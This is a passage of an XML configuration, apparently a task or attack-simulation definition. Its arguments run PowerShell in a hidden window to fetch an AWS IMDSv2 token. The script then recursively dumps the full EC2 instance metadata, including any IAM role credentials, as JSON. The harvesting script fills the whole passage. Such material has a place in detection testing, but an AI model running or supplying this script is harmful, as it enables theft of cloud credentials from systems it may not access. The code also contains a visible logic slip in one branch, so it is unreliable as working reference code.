            <argument>-NonInteractive -WindowStyle Hidden -NoProfile</argument>
            <argument>$metadata_server='http://169.254.169.254/latest/';$web=New-Object Net.WebClient;$web.Headers.Add('X-aws-ec2-metadata-token-ttl-seconds','21600');$parameters=New-Object System.Collections.Specialized.NameValueCollection;$token=[System.Text.Encoding]::Default.GetString($web.UploadValues($metadata_server+'api/token','PUT',$parameters));$result_dict=New-Object 'System.Collections.Generic.Dictionary[string,string]';Function api_gen($url){$web=New-Object Net.WebClient;$web.Headers.Add('X-aws-ec2-metadata-token',$token);try{$output=$web.DownloadString($url);return($output);}catch{return}}Function explore_api($path_dict){foreach ($path in $path_dict.Keys){if ($path.substring($path.length -1,1) -ne '/'){$fullUrl=$metadata_server + $path;$result=api_gen $fullUrl;if ($returnValue){$result_dict[$path]=$result;}}else{$fullUrl=$metadata_server + $path;$returnValue=api_gen $fullUrl;if ($returnValue){$temp_dict=New-Object 'System.Collections.Generic.Dictionary[string,string]';$resultArray=$returnValue.split([Environment]::NewLine);foreach ($result in $resultArray){if ($result -ne ''){$temp_dict[$path+$result]='';}}explore_api $temp_dict;}}}}Function init($url){$returnValue=api_gen $url;if ($returnValue){$path_dict=New-Object 'System.Collections.Generic.Dictionary[string,string]';$resultArray=$returnValue.split([Environment]::NewLine);foreach ($result in $resultArray){$path_dict[$result+'/']='';}return $path_dict;}}$path_dict=init $metadata_server;explore_api $path_dict;$result_dict | ConvertTo-JSON;</argument>
